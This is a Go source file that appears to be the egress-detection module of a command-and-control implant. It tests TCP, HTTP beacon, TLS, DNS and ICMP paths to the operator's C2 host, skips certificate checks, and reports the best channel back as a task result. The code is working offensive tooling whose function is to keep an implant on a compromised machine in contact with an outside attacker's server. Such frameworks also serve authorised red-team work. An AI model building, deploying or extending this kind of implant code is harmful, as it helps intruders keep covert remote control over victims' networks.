//go:build linux || windows || darwin
// +build linux windows darwin

package main

import (
	"crypto/tls"
	"encoding/json"
	"fmt"
	"net"
	"net/http"
	"strconv"
	"strings"
	"time"
)

type EgressResult struct {
	Protocol string `json:"protocol"`
	Target   string `json:"target"`
	Success  bool   `json:"success"`
	Latency  int64  `json:"latency_ms"`
	Error    string `json:"error,omitempty"`
}

type EgressReport struct {
	Results   []EgressResult `json:"results"`
	Best      string         `json:"best_protocol"`
	Timestamp int64          `json:"timestamp"`
}

func runEgressDetection(c2Host string, c2Ports []int) *EgressReport {
	var results []EgressResult

	// 1. TCP connect test
	for _, port := range c2Ports {
		start := time.Now()
		addr := net.JoinHostPort(c2Host, strconv.Itoa(port))
		conn, err := net.DialTimeout("tcp", addr, 5*time.Second)
		if err == nil {
			conn.Close()
			results = append(results, EgressResult{
				Protocol: fmt.Sprintf("tcp/%d", port),
				Target:   addr,
				Success:  true,
				Latency:  time.Since(start).Milliseconds(),
			})
		}
	}

	// 2. HTTP GET test
	for _, port := range c2Ports {
		if port == 443 || port == 8443 {
			continue
		}
		start := time.Now()
		url := fmt.Sprintf("http://%s:%d%s", c2Host, port, BeaconURI)
		req, err := http.NewRequest("GET", url, nil)
		if err != nil {
			continue
		}
		req.Header.Set("User-Agent", getActiveUserAgentFromConfig())
		resp, err := client.Do(req)
		if err == nil {
			resp.Body.Close()
			// A captive portal or proxy can answer with 4xx/5xx — that proves
			// nothing about egress. Only a real C2 response (2xx/3xx) counts.
			if resp.StatusCode >= 200 && resp.StatusCode < 400 {
				results = append(results, EgressResult{
					Protocol: fmt.Sprintf("http/%d", port),
					Target:   url,
					Success:  true,
					Latency:  time.Since(start).Milliseconds(),
				})
			}
		}
	}

	// 3. HTTPS/TLS handshake test
	for _, port := range c2Ports {
		if port != 443 && port != 8443 {
			continue
		}
		start := time.Now()
		addr := net.JoinHostPort(c2Host, strconv.Itoa(port))
		// #nosec G402 -- egress detection probes the operator's own C2 ports for reachability; no secret crosses this TLS session.
	conn, err := tls.DialWithDialer(&net.Dialer{Timeout: 5 * time.Second}, "tcp", addr, &tls.Config{InsecureSkipVerify: true}) // #nosec G402
		if err == nil {
			conn.Close()
			results = append(results, EgressResult{
				Protocol: fmt.Sprintf("https/%d", port),
				Target:   addr,
				Success:  true,
				Latency:  time.Since(start).Milliseconds(),
			})
		}
	}

	// 4. DNS resolution test
	if DNSDomain != "" {
		start := time.Now()
		addrs, err := net.LookupHost(DNSDomain)
		if err == nil && len(addrs) > 0 {
			results = append(results, EgressResult{
				Protocol: "dns",
				Target:   DNSDomain,
				Success:  true,
				Latency:  time.Since(start).Milliseconds(),
			})
		}
	}

	// 5. ICMP echo test (best-effort, requires privileges)
	err := icmpEcho(c2Host)
	if err == nil {
		results = append(results, EgressResult{
			Protocol: "icmp",
			Target:   c2Host,
			Success:  true,
			Latency:  0,
		})
	}

	// Select best protocol (lowest latency among successful)
	best := ""
	var bestLatency int64 = 1<<63 - 1
	for _, r := range results {
		if r.Success && r.Latency < bestLatency {
			bestLatency = r.Latency
			best = r.Protocol
		}
	}

	return &EgressReport{
		Results:   results,
		Best:      best,
		Timestamp: time.Now().Unix(),
	}
}

// icmpEcho attempts an ICMP echo request (best-effort, requires privileges)
func icmpEcho(host string) error {
	conn, err := net.DialTimeout("ip4:icmp", host, 3*time.Second)
	if err != nil {
		return err
	}
	conn.Close()
	return nil
}

// handleRunEgress handles the run_egress task
func handleRunEgress(task Task, res *TaskResult) {
	c2Host := extractC2Host()
	ports := parseEgressPorts()
	report := runEgressDetection(c2Host, ports)
	if report.Best != "" {
		bestEgressProto = report.Best
	}
	data, err := json.Marshal(report)
	if err != nil {
		res.Error = err.Error()
		return
	}
	res.Output = string(data)
	res.Encoding = "json"
}

// extractC2Host extracts the hostname from the current C2 URL
func extractC2Host() string {
	urls := c2URLsSnapshot()
	if len(urls) == 0 {
		return "127.0.0.1"
	}
	idx := currentC2Idx.Load()
	if idx < 0 || idx >= int32(len(urls)) {
		currentC2Idx.Store(0)
		idx = 0
	}
	raw := urls[int(idx)]
	prefixes := []string{"http://", "https://", "tcp://", "tls://", "ssh://", "dns://", "smb://"}
	for _, p := range prefixes {
		if strings.HasPrefix(raw, p) {
			raw = strings.TrimPrefix(raw, p)
			break
		}
	}
	host := raw
	if idx := strings.IndexByte(raw, ':'); idx >= 0 {
		host = raw[:idx]
	}
	if idx := strings.IndexByte(host, '/'); idx >= 0 {
		host = host[:idx]
	}
	if host == "" {
		return "127.0.0.1"
	}
	return host
}

// parseEgressPorts parses the port list from EgressPortsStr
func parseEgressPorts() []int {
	parts := strings.Split(EgressPortsStr, ",")
	ports := make([]int, 0, len(parts))
	for _, p := range parts {
		p = strings.TrimSpace(p)
		if p == "" {
			continue
		}
		port, err := strconv.Atoi(p)
		if err == nil && port > 0 && port <= 65535 {
			ports = append(ports, port)
		}
	}
	if len(ports) == 0 {
		return []int{80, 443, 8080, 8443, 53, 22, 2222}
	}
	return ports
}
